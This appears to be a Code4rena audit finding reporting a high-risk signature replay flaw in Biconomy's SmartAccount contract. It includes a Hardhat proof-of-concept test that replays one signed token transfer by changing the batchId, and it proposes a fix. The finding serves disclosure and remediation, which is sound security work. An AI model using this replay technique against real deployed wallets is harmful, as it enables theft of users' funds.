## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- edited-by-warden
- H-07

# [Replay attack (EIP712 signed transaction)](https://github.com/code-423n4/2023-01-biconomy-findings/issues/36) 

# Lines of code

https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L212


# Vulnerability details

## Impact
Signed transaction can be replayed. First user transaction can always be replayed any amount of times. With non-first transactions attack surface is reduced but never dissapears

## Why it possible
Contract checks `nonces[batchId]` but not `batchId` itself, so we could reuse other batches nounces. If before transaction we have `n` batches with the same nonce as transaction batch, then transaction can be replayed `n` times. Since there are 2^256 `batchId`s with nonce = 0, first transaction in any batch can be replayed as much times as attacker needs.

## Proof of Concept
Insert this test in `testGroup1.ts` right after `Should set the correct states on proxy` test:

    it("replay EIP712 sign transaction", async function () {
      await token
      .connect(accounts[0])
      .transfer(userSCW.address, ethers.utils.parseEther("100"));

    const safeTx: SafeTransaction = buildSafeTransaction({
      to: token.address,
      data: encodeTransfer(charlie, ethers.utils.parseEther("10").toString()),
      nonce: await userSCW.getNonce(0),
    });

    const chainId = await userSCW.getChainId();
    const { signer, data } = await safeSignTypedData(
      accounts[0],
      userSCW,
      safeTx,
      chainId
    );

    const transaction: Transaction = {
      to: safeTx.to,
      value: safeTx.value,
      data: safeTx.data,
      operation: safeTx.operation,
      targetTxGas: safeTx.targetTxGas,
    };
    const refundInfo: FeeRefund = {
      baseGas: safeTx.baseGas,
      gasPrice: safeTx.gasPrice,
      tokenGasPriceFactor: safeTx.tokenGasPriceFactor,
      gasToken: safeTx.gasToken,
      refundReceiver: safeTx.refundReceiver,
    };

    let signature = "0x";
    signature += data.slice(2);


    await expect(
      userSCW.connect(accounts[2]).execTransaction(
        transaction,
        0, // batchId
        refundInfo,
        signature
      )
    ).to.emit(userSCW, "ExecutionSuccess");

    //contract checks nonces[batchId] but not batchId itself
    //so we can change batchId to the one that have the same nonce
    //this would replay transaction
    await expect(
      userSCW.connect(accounts[2]).execTransaction(
        transaction,
        1, // changed batchId
        refundInfo,
        signature
      )
    ).to.emit(userSCW, "ExecutionSuccess");

    //charlie would have 20 tokens after this
    expect(await token.balanceOf(charlie)).to.equal(
      ethers.utils.parseEther("20")
    );
    });

## Recommended Mitigation Steps
add `batchId` to the hash calculation of the transaction in `encodeTransactionData` function